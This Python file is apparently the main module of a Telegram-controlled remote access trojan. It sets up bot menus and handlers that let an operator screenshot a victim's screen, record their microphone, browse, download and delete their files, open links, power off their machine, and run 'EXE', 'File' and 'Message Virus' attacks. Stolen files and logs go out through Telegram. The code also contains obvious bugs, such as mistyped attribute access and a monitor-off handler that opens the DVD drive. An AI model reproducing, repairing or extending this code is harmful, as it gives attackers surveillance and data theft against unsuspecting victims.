# [~] Main.py
# Codeing "UTF-8"
# CopyRight (C) 2023 By *Mr-Melfex*
# License BCD (SEE LICENSE IN MAIN FOLDER)

from 	Core.Main_Core					import 	*
from	Config.Main_Config				import 	*
from	Modules.Modules 				import	*
from	Version.Main_Version			import	*
from	Proxy.Main_Proxy				import	*
from    Banner.MainBanner				import	*

#\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\#

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = telebot.util.ThreadPool(num_threads=50)

ReplyKeboard = telebot.types.ReplyKeyboardMarkup()
Button1 = telebot.types.KeyboardButton("ُRat Setting")
Button2 = telebot.types.KeyboardButton("ُTarget Info")
Button7 = telebot.types.KeyboardButton("ُAttack")
Button3 = telebot.types.KeyboardButton("Tolls")
Button4 = telebot.types.KeyboardButton("Power")
Button5 = telebot.types.KeyboardButton("Developer")
Button6 = telebot.types.KeyboardButton("Help")
ReplyKeboard.row(Button1)
ReplyKeboard.row(Button2, Button3, Button7)
ReplyKeboard.row(Button4, Button5, Button6)

RatInlineMenu = telebot.types.InlineKeyboardMarkup()
RButton1 = telebot.types.InlineKeyboardButton("Run Complate", callback_data="RunCom")
RButton2 = telebot.types.InlineKeyboardButton("Change Proxy", callback_data="ChProxy")
RButton3 = telebot.types.InlineKeyboardButton("Cahnge Directory", callback_data="ChDirect")
RButton7 = telebot.types.InlineKeyboardButton("Check Update", callback_data="CheckUpdateI")
RButton4 = telebot.types.InlineKeyboardButton("Uninstall Rat", callback_data="Uninstall")
RButton5 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
RButton6 = telebot.types.InlineKeyboardButton("[ BACK ]", callback_data="Back")
RatInlineMenu.row(RButton1)
RatInlineMenu.row(RButton2, RButton3)
RatInlineMenu.row(RButton4)
RatInlineMenu.row(RButton5, RButton6)

TargetInlineMenu = telebot.types.InlineKeyboardMarkup()
TButton1 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
TButton2 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")
TargetInlineMenu.row(TButton1, TButton2)

AtInlineMenu = telebot.types.InlineKeyboardMarkup()
AButton1 = telebot.types.InlineKeyboardButton("EXE Attack", callback_data="EXEAttack")
AButton2 = telebot.types.InlineKeyboardButton("File Attack", callback_data="FileATTack")
AButton3 = telebot.types.InlineKeyboardButton("Swap Mouse", callback_data="SWPMouse")
AButton4 = telebot.types.InlineKeyboardButton("Open DVD", callback_data="OpenDVD")
AButton5 = telebot.types.InlineKeyboardButton("Off Monitor", callback_data="OFFMonitor")
AButton6 = telebot.types.InlineKeyboardButton("Message Virus", callback_data="MessageVirus")
AButton7 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
AButton8 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")
AtInlineMenu.row(AButton1, AButton2)
AtInlineMenu.row(AButton3, AButton4)
AtInlineMenu.row(AButton5, AButton6)
AtInlineMenu.row(AButton7, AButton8)

Tol1InlineMenu = telebot.types.InlineKeyboardMarkup()
ToButton10 = telebot.types.InlineKeyboardButton("Download Log File", callback_data="DLog")
ToButton1 = telebot.types.InlineKeyboardButton("Chrome Info", callback_data="ChromIn")
ToButton2 = telebot.types.InlineKeyboardButton("ScreenShut", callback_data="ScreenShut")
ToButton3 = telebot.types.InlineKeyboardButton("Task List", callback_data="TaskLest")
ToButton4 = telebot.types.InlineKeyboardButton("kill all Task", callback_data="KillATask")
ToButton5 = telebot.types.InlineKeyboardButton("Wifi Info", callback_data="WifiInfo")
ToButton6 = telebot.types.InlineKeyboardButton("Scan Wifi", callback_data="ScanWifi")
ToButton7 = telebot.types.InlineKeyboardButton("Next Menu\n<< >>", callback_data="NexMenu")
ToButton8 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
ToButton9 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")
Tol1InlineMenu.row(ToButton10)
Tol1InlineMenu.row(ToButton1, ToButton2)
Tol1InlineMenu.row(ToButton3, ToButton4)
Tol1InlineMenu.row(ToButton5, ToButton6)
Tol1InlineMenu.row(ToButton7)
Tol1InlineMenu.row(ToButton8, ToButton9)

Tol2InlineMenu = telebot.types.InlineKeyboardMarkup()
To2Button1 = telebot.types.InlineKeyboardButton("Back Menu\n<< >>", callback_data="Backmenu")
To2Button2 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
To2Button3 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")
Tol2InlineMenu.row(To2Button1)
Tol2InlineMenu.row(To2Button2, To2Button3)

PowerInlineMenu = telebot.types.InlineKeyboardMarkup()
PButton1 = telebot.types.InlineKeyboardButton("ShutDown", callback_data="ShutDownI")
PButton2 = telebot.types.InlineKeyboardButton("Restart", callback_data="RestartI")
PButton3 = telebot.types.InlineKeyboardButton("Sleep", callback_data="SleepI")
PButton4 = telebot.types.InlineKeyboardButton("logOff", callback_data="LogOffI")
PButton5 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
PButton6 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")
PowerInlineMenu.row(PButton1, PButton2)
PowerInlineMenu.row(PButton3, PButton4)
PowerInlineMenu.row(PButton5, PButton6)

DevInlineMenu = telebot.types.InlineKeyboardMarkup()
DButton1 = telebot.types.InlineKeyboardButton("TeleGram", Url="t.me/Melfex")
DButton2 = telebot.types.InlineKeyboardButton("GitHub", url="")
DButton3 = telebot.types.InlineKeyboardButton("[ HELP ]", callback_data="Help")
DButton4 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")
DevInlineMenu.row(DButton1)
DevInlineMenu.row(DButton2)
DevInlineMenu.row(DButton3, DButton4)

HelpInlineMenu = telebot.types.InlineKeyboardMarkup()
HButton1 = telebot.types.InlineKeyboardButton("[ Back ]", callback_data="Back")

#\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\#

@bot.message_handler(commands=["/Start", "/start"])
def START(command):
	bot.send_message(command.chat.id, reply_markup=ReplyKeboard, parse_mode="Markdown")

@bot.message_handler(commands=["Rat_Setting", "rat_setting"])
def RatSet(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, RatSettingBanner, reply_markup=RatInlineMenu, parse_mode="Markdown")

@bot.message_handler(commands=["ُAttack", "attack"])
def ATTACK(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, AttackBanner, reply_markup=AtInlineMenu, parse_mode="Markdown")

@bot.message_handler(commands=["ُTarget_Info", "ُtarget_info"])
def INFO(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, TargetInfoBanner, reply_markup=TargetInlineMenu, parse_mode="Markdown")
	
@bot.message_handler(commands=["Tolls", "tolls"])
def Toll1(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, Tolls1Banner, reply_markup=Tol1InlineMenu, parse_mode="Markdown")

@bot.message_handler(commands=["Power", "power"])
def PowerI(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, PowerBanner, reply_markup=PowerInlineMenu, parse_mode="Markdown")

@bot.message_handler(commands=["Developer", "developer"])
def DevI(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, DevBanner, reply_markup=DevInlineMenu, parse_mode="Markdown")

@bot.message_handler(commands=["Help", "help"])
def HelpI(command):
	bot.send_chat_action(command.chat.id, "__Pleas Wait..__")
	bot.send_message(command.chat.id, HelpBanner, reply_markup=HelpInlineMenu, parse_mode="Markdown")

@bot.message_handler(regexp=["/ScreenShot"])
def SCREEN(command):
	try:
		Screenshot()
		File = open(Direct + "SCREEN.jpg", "rb")
		bot.send_chat_action(command.chat.id, "__[:D] Pleas Wait. Sending Photo..__")
		bot.send_photo(command.chat.id, File)
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! Cant Take Screen. Please try again /**", parse_mode="Markdown")

@bot.message_handler(regexp=["/MessageBox"])
def MESSAGE(command):
	try:
		Msg = re.split("/MessageBox ", command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[:D] Pleas Wait. Show your message..__")
		MessageBox2(Msg)
		bot.send_message(command.chat.id, "**[:D] Complate!**", parse_mode="Markdown")
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! Cant show message. try again `/MessageBox `**", parse_mode="Markdown")

@bot.message_handler(regexp=["/VoiseMessage"])
def VMESSAGE(command):
	try:
		Msg = re.split("/VoiseMessage ", command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Play your voice message..__")
		VoiceMessage(Msg)
		bot.send_message(command.chat.id, "**[:D] Complate!**", parse_mode="Markdown")
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! Cant play voice message. try again `/VoiseMessage `**", parse_mode="Markdown")

@bot.message_handler(regexp=["/VoiceRecorder"])
def VRECORD(command):
	try:
		Msg = re.split("/VoiceRecorder ", command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Recording voice..__")
		VoiceRecorder(Msg)
		File = open(Direct + "VOICE.wav", "rb")
		bot.send_chat_action(command.chat.id, "__[~] Sending File..__")
		bot.send_voice(command.chat.id, File)
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! Cant record voice. try again `/VoiceRecorder `**", parse_mode="Markdown")

@bot.message_handler(regexp=["/Ls"])
def LS(command):
	try:
		Dir = re.split("/Ls ", command.text, flags=re.I)[1]
		ShowIthemFolder(Dir)
		bot.send_chat_action(command.chat.id, "__[~] Sending File..__")
		File = open(Direct + "IthemFolderInfo.txt", "rb")
		bot.send_document(command.chat.id, File)
		os.remove(File)
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! try again `/Ls `")

@bot.message_handler(regexp=["/RenameFile"])
def RENAME(command):
	try:
		Fname = re.split("/Rename ". command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Rename..__")
		RenameFile(Fname)
		bot.send_message(command.chat.id, "**[:D] Rename Complate!**", parse_mode="Markdown")
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! try again. `/RenameFile `")

@bot.message_handler(regexp=["/RemoveFolder"])
def RFOLDER(command):
	try:
		Fname = re.split("/RemoveFolder ".command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Remove Folder..__")
		RemoveFolfer(Fname)
		bot.send_message(command.chat.id, "**[:D] Remove Folder Complate!", parse_mode="Markdown")
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! try again. `/RemoveFile `", parse_mode="Markdown")

@bot.message_handler(regexp=["/RemoveFile"])
def RFILE(command):
	try:
		Fname = re.split("/RemoveFile ".command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Remove File..__")
		RemoveFile(Fname)
		bot.send_message(command.chat.id, "**[:D] Remove File Complate!")
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! try again `/RemoveFile `", parse_mode="Markdown")
	
@bot.message_handler(regexp=["/Download"])
def DOWNLOAD(command):
	try:
		Dname = re.split("/Download ".command.text, flags=re.I)[1]
		Down = open(Dname, "rb")
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Sending File..__")
		bot.send_document(command.chat.id, Down)
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! try again `/Download `", parse_mode="Markdown")

@bot.message_handler(regexp=["/OpenLink"])
def OLINK(command):
	try:
		Link = re.split("/OpenLink ".command.text, flags=re.I)[1]
		bot.send_chat_action(command.chat.id, "__[~] Pleas Wait. Open Linke..__")
		OpenUrl(Link)
		bot.send_message(command.chat.id, "**[:D] Open Link Complate!", parse_mode="Markdown")
	except:
		bot.send_message(command.chat.id, "**[O_O] ERROR! try again. `/OpenLink `", parse_mode="Markdown")

def SMessage(call, text):
	try:
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass

@bot.callback_query_handler(func=lambda call: True)
def CBInlnline(command):
	if command.message:
		if command.date == "Help":
			bot.edit_message_text(command.chat.id, HelpBanner, reply_markup=HelpInlineMenu, parse_mode="Markdown")
		if command.date == "Back":
			bot.edit_message_text(command.chat.id, StartBanner, reply_markup=ReplyKeboard, parse_mode="Markdown")
		if command.date == "NexMenu":
			bot.send_message(command.chat.id, Tolls2Banner, reply_markup=Tol2InlineMenu, parse_mode="Markdown")
		if command.date == "Backmenu":
			bot.send_message(command.chat.id, "", reply_markup=Tol1InlineMenu, parse_mode="Markdown")
		if command.date == "ShutDownI":
			SMessage(command, "__[~] Pleas Wait. ShutDown..")
			try:
				ShutDown()
				SMessage(command, "**[:D] ShutDown Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "RestartI":
			SMessage(command, "__[~] Pleas Wait. Restart..")
			try:
				Restart()
				SMessage(command, "**[:D] Restart Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "SleepI":
			SMessage(command, "__[~] Pleas Wait. Sleep..__")
			try:
				Sleep()
				SMessage(command, "**[:D] Sleep Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "LogOffI":
			SMessage(command, "__[~] Pleas Wait. LogOff..__")
			try:
				Logoff()
				SMessage(command, "**[:D] LogOff Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "ChromIn":
			SMessage(command, "__[~] Pleas Wait. Check Chrome Info..__")
		if command.date == "EXEAttack":
			try:
				SMessage(command, "__[~] Pleas Wait. Exe Attack Started..__")
				ExeAttack()
				SMessage(command, "**[:D] Exe Attack Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
				
		if command.date == "FileATTack":
			try:
				SMessage(command, "__[~] Pleas Wait. File Attack Started..__")
				FileAttack(AttackDirect)
				SMessage(command, "**[:D] File Attack Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "SWPMouse":
			try:
				SMessage(command, "__[~] Pleas Wait. Swap Mouse Started..__")
				SwapMouse()
				SMessage(command, "**[:D] Swap Mouse Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "OpenDVD":
			try:
				SMessage(command, "__[~] Pleas Wait. Open DVD Drive Started..__")
				OpenDvdDrive()
				SMessage(command, "**[:D] Open DVD Drive Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "OFFMonitor":
			try:
				SMessage(command, "__[~] Pleas Wait. Offing Monitor Started..__")
				OpenDvdDrive()
				SMessage(command, "**[:D] Offing Monitor Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "MessageVirus":
			try:
				SMessage(command, "__[~] Pleas Wait. Message Virus Started..__")
				MessageBox1(MessageAttak)
				SMessage(command, "**[:D] Message Virus Complate!**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")
		if command.date == "DLog":
			try:
				SMessage(command, "__[~] Pleas Wait. Download File..__")
				SendLog()
				SMessage(command, "**[:D] Download Log File Complate**")
			except:
				SMessage(command, "[O_O] ERROR! try again..")

#\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\#

try:
	bot.polling(none_stop=True)
except:
	LOG("[!] ERROR! Bot Handle Filed")
	os.startfile(Path)
	sys.exit()
